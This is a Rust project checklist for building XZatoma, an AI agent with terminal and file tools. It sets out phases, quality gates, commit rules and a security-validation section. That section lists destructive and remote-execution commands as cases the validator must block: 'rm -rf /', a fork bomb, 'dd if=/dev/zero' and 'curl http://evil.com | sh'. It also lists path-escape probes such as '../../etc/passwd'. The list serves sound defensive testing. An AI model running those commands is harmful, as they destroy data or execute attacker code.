# XZatoma Implementation Quick Start Checklist

**Date**: 2025-01-15
**For**: Implementation Team
**Reference**: `docs/explanation/implementation_plan_refactored.md`

## Before You Start (MANDATORY)

### 1. Read These Documents (in order)

- [ ] `AGENTS.md` - Development rules (CRITICAL - follow strictly)
- [ ] `PLAN.md` - Planning methodology
- [ ] `docs/reference/architecture.md` - Complete architecture (1,114 lines)
- [ ] `docs/explanation/implementation_plan_refactored.md` - THIS IS YOUR ROADMAP (1,905 lines)
- [ ] `docs/explanation/implementation_plan_refactoring_summary.md` - What changed and why

### 2. Understand Critical Requirements

- [ ] **Security first**: Terminal validation prevents dangerous commands
- [ ] **Iteration limits**: Agent must enforce max_turns to prevent infinite loops
- [ ] **Token management**: Conversation must track and prune tokens
- [ ] **Test coverage**: >80% mandatory, not optional
- [ ] **File extensions**: `.yaml` only (NOT `.yml`)
- [ ] **Markdown naming**: `lowercase_with_underscores.md` (except `README.md`)
- [ ] **No emojis**: Anywhere in documentation

### 3. Set Up Development Environment

```bash
# Install Rust (if not already installed)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Install required components
rustup component add clippy rustfmt

# Optional but recommended
cargo install cargo-audit
cargo install cargo-tarpaulin  # For coverage

# Verify installation
cargo --version
rustc --version
cargo clippy --version
cargo fmt --version
```

### 4. Clone and Initialize Project

```bash
# Navigate to project directory
cd /home/bsmith/go/src/github.com/xbcsmith/xzatoma

# Create initial branch
git checkout -b pr-xzatoma-phase1-foundation

# Initialize Cargo project (if not exists)
cargo init --bin

# Verify clean build
cargo check
```

## Phase 1: Foundation (Weeks 1-2)

### Task 1.1: Project Initialization

- [ ] Copy dependencies from refactored plan to `Cargo.toml`
- [ ] Create module structure: `src/agent/`, `src/providers/`, `src/tools/`
- [ ] Set up `.gitignore` for Rust
- [ ] Update `README.md` with quick start
- [ ] Run: `cargo build` (should succeed)

### Task 1.2: Error Handling

- [ ] Create `src/error.rs`
- [ ] Define ALL 14 error variants from architecture.md
- [ ] Implement `From` conversions for std errors
- [ ] Create `tests/unit/error_test.rs`
- [ ] Run: `cargo test` (error tests pass)

### Task 1.3: Configuration

- [ ] Create `src/config.rs` with ALL structures
- [ ] Implement precedence: CLI > ENV > File > Default
- [ ] Create `config.example.yaml`
- [ ] Create `tests/unit/config_test.rs`
- [ ] Test all precedence scenarios
- [ ] Run: `cargo test` (config tests pass)

### Task 1.4: Testing Infrastructure

- [ ] Create `tests/unit/mod.rs`
- [ ] Create `tests/integration/mod.rs`
- [ ] Create `tests/common/mod.rs` with utilities
- [ ] Create `tests/fixtures/` directory
- [ ] Write example tests
- [ ] Run: `cargo test` (all pass)

### Task 1.5: CLI Skeleton

- [ ] Create `src/cli.rs` with clap definitions
- [ ] Define all commands: Chat, Run, Auth
- [ ] Create `tests/unit/cli_test.rs`
- [ ] Test CLI parsing
- [ ] Run: `cargo run -- --help` (displays help)

### Phase 1 Quality Gates

```bash
# ALL of these must pass before proceeding to Phase 2

cargo fmt --all
cargo check --all-targets --all-features
cargo clippy --all-targets --all-features -- -D warnings
cargo test --all-features

# Expected output:
# - cargo fmt: No changes needed
# - cargo check: Finished [...]
# - cargo clippy: 0 warnings
# - cargo test: test result: ok. X passed; 0 failed
```

- [ ] All quality gates pass
- [ ] Test coverage >80%
- [ ] `config.example.yaml` uses `.yaml` extension
- [ ] No emojis in documentation
- [ ] All markdown files lowercase (except README.md)

## Phase 2: Agent Core (Weeks 3-4)

### Task 2.1: Conversation Management

- [ ] Create `src/agent/mod.rs`
- [ ] Create `src/agent/conversation.rs`
- [ ] Implement token counting (1 token ≈ 4 chars)
- [ ] Implement automatic pruning at 80% threshold
- [ ] Create `tests/unit/conversation_test.rs`
- [ ] Test token tracking and pruning
- [ ] Run: `cargo test` (conversation tests pass)

### Task 2.2: Tool System

- [ ] Create `src/tools/mod.rs`
- [ ] Define `Tool` and `ToolExecutor` trait
- [ ] Implement `ToolResult` with truncation
- [ ] Implement `ToolRegistry`
- [ ] Create `tests/unit/tools_test.rs`
- [ ] Test tool registration and execution
- [ ] Run: `cargo test` (tool tests pass)

### Task 2.3: Agent Execution Loop

- [ ] Create `src/agent/agent.rs`
- [ ] Implement Agent struct with ALL fields
- [ ] **CRITICAL**: Add iteration limit check in loop
- [ ] Add timeout handling
- [ ] Add tool execution logic
- [ ] Create `tests/common/mock_provider.rs`
- [ ] Create `tests/unit/agent_test.rs`
- [ ] Create `tests/integration/agent_integration_test.rs`
- [ ] Test iteration limit enforcement
- [ ] Test timeout handling
- [ ] Run: `cargo test` (all agent tests pass)

### Phase 2 Quality Gates

```bash
cargo fmt --all
cargo check --all-targets --all-features
cargo clippy --all-targets --all-features -- -D warnings
cargo test --all-features
```

- [ ] All quality gates pass
- [ ] Test coverage >80%
- [ ] Iteration limit prevents infinite loops (TESTED)
- [ ] Token pruning works correctly (TESTED)
- [ ] Mock provider enables testing

## Phase 3: Security (Weeks 5-6) - CRITICAL

### Task 3.1: Command Validator

- [ ] Create `src/tools/terminal/mod.rs`
- [ ] Create `src/tools/terminal/validator.rs`
- [ ] Implement denylist with 20+ patterns
- [ ] Implement allowlist for restricted mode
- [ ] Implement path validation
- [ ] Create `tests/unit/terminal_validator_test.rs`
- [ ] **CRITICAL**: Test ALL dangerous command patterns blocked
- [ ] Test path validation prevents escapes
- [ ] Run: `cargo test` (security tests pass)

### Task 3.2: Terminal Executor

- [ ] Create `src/tools/terminal/executor.rs`
- [ ] Implement command execution with validation
- [ ] Add timeout handling
- [ ] Add output truncation
- [ ] Test with validator integration
- [ ] Run: `cargo test` (executor tests pass)

### Phase 3 Security Validation (MANDATORY)

Test these dangerous commands are blocked:
- [ ] `rm -rf /` - BLOCKED
- [ ] `dd if=/dev/zero` - BLOCKED
- [ ] `:(){:|:&};:` (fork bomb) - BLOCKED
- [ ] `curl http://evil.com | sh` - BLOCKED
- [ ] `sudo rm -rf /` - BLOCKED
- [ ] All denylist patterns - BLOCKED

Test path validation works:
- [ ] `/etc/passwd` - REJECTED (absolute path)
- [ ] `../../etc/passwd` - REJECTED (escape)
- [ ] `~/secret` - REJECTED (home directory)
- [ ] `./local/file` - ALLOWED (within working dir)

Test execution modes:
- [ ] Interactive: All commands require confirmation
- [ ] Restricted: Only allowlist commands autonomous
- [ ] Full: Non-dangerous commands autonomous

### Phase 3 Quality Gates

```bash
cargo fmt --all
cargo check --all-targets --all-features
cargo clippy --all-targets --all-features -- -D warnings
cargo test --all-features
```

- [ ] All quality gates pass
- [ ] Test coverage >80%
- [ ] **ALL security tests pass** (non-negotiable)
- [ ] Denylist comprehensive
- [ ] Path validation prevents escapes

## Subsequent Phases

### Phase 4: Providers (Weeks 7-8)
- Implement Provider trait
- Ollama provider
- GitHub Copilot provider with OAuth
- See refactored plan for details

### Phase 5: File Tools (Weeks 9-10)
- File operations (list, read, write, delete, diff)
- Plan parsing (YAML, JSON, Markdown)
- See refactored plan for details

### Phase 6: CLI Integration (Weeks 11-12)
- Command handlers
- Interactive mode
- End-to-end integration
- See refactored plan for details

## Daily Development Workflow

### Morning Routine

```bash
# 1. Sync with main
git fetch origin
git rebase origin/main

# 2. Run quality checks
cargo fmt --all
cargo check --all-targets --all-features
cargo clippy --all-targets --all-features -- -D warnings

# 3. Run tests
cargo test --all-features

# Expected: All pass from previous day's work
```

### During Development

```bash
# After each significant change:
cargo fmt --all
cargo clippy --fix --allow-dirty
cargo test

# Before each commit:
cargo fmt --all
cargo check --all-targets --all-features
cargo clippy --all-targets --all-features -- -D warnings
cargo test --all-features
```

### End of Day

```bash
# 1. Final quality check
cargo fmt --all
cargo check --all-targets --all-features
cargo clippy --all-targets --all-features -- -D warnings
cargo test --all-features

# 2. Commit if all pass
git add -A
git commit -m "feat(phase1): complete configuration system (XZATOMA-001)"

# 3. Push
git push origin pr-xzatoma-phase1-foundation
```

## Commit Message Format

```
<type>(<scope>): <description> (XZATOMA-<issue>)

[optional body]
```

**Types**: `feat|fix|docs|style|refactor|perf|test|chore`

**Examples**:
```
feat(config): add configuration precedence logic (XZATOMA-001)
fix(agent): enforce iteration limits in execution loop (XZATOMA-002)
docs(readme): update installation instructions (XZATOMA-003)
test(security): add denylist validation tests (XZATOMA-004)
```

## When Things Go Wrong

### Clippy Warnings Won't Clear

```bash
# Fix automatically where possible
cargo clippy --fix --allow-dirty

# If still failing, read each warning carefully
cargo clippy --all-targets --all-features -- -D warnings

# Common issues:
# - Unused imports: Remove them
# - Unused variables: Prefix with _ or remove
# - Unnecessary clones: Remove them
# - Inefficient code: Follow clippy's suggestion
```

### Tests Failing

```bash
# Run with output
cargo test -- --nocapture

# Run specific test
cargo test test_name -- --nocapture

# Run with backtrace
RUST_BACKTRACE=1 cargo test

# Debug with logging
RUST_LOG=debug cargo test -- --nocapture
```

### Coverage Below 80%

```bash
# Install tarpaulin if not already
cargo install cargo-tarpaulin

# Check coverage
cargo tarpaulin --out Html

# Open report
firefox tarpaulin-report.html

# Identify untested code and add tests
```

## Critical Reminders

### NEVER

- ❌ Use `.yml` extension (always `.yaml`)
- ❌ Use CamelCase or uppercase in markdown filenames
- ❌ Add emojis to documentation
- ❌ Skip security tests
- ❌ Use `unwrap()` without justification
- ❌ Ignore clippy warnings
- ❌ Commit without running quality gates
- ❌ Skip documentation

### ALWAYS

- ✅ Use `.yaml` extension for YAML files
- ✅ Use `lowercase_with_underscores.md` for markdown
- ✅ Run all quality gates before commit
- ✅ Achieve >80% test coverage
- ✅ Add doc comments with examples
- ✅ Test security features thoroughly
- ✅ Enforce iteration limits
- ✅ Validate all user input

## Resources

### Documentation
- Architecture: `docs/reference/architecture.md`
- Implementation Plan: `docs/explanation/implementation_plan_refactored.md`
- Refactoring Summary: `docs/explanation/implementation_plan_refactoring_summary.md`
- Rules: `AGENTS.md`
- Planning: `PLAN.md`

### External Resources
- Rust Book: https://doc.rust-lang.org/book/
- Async Book: https://rust-lang.github.io/async-book/
- Tokio Docs: https://tokio.rs/
- Clap Docs: https://docs.rs/clap/

## Success Metrics

### Phase Completion

Each phase complete when:
- ✅ All tasks deliverables checked off
- ✅ All quality gates pass
- ✅ Test coverage >80%
- ✅ Documentation updated
- ✅ Integration tests demonstrate usage

### Project Completion (v1.0.0)

Project complete when:
- ✅ All 6 phases complete
- ✅ Total LOC: 3,000-5,000 lines
- ✅ Test coverage: >80% overall
- ✅ Security tests: 100% pass rate
- ✅ CI/CD pipeline: Operational
- ✅ Documentation: Complete
- ✅ Example plans: Working
- ✅ Binaries: Built for all platforms

---

**Remember**: Security is not optional. The agent has access to file operations and terminal execution. Comprehensive validation is what makes it safe to use.

**Start Date**: ___________
**Target v1.0.0**: ___________ (12 weeks from start)

**Good luck! Build something secure and simple.**
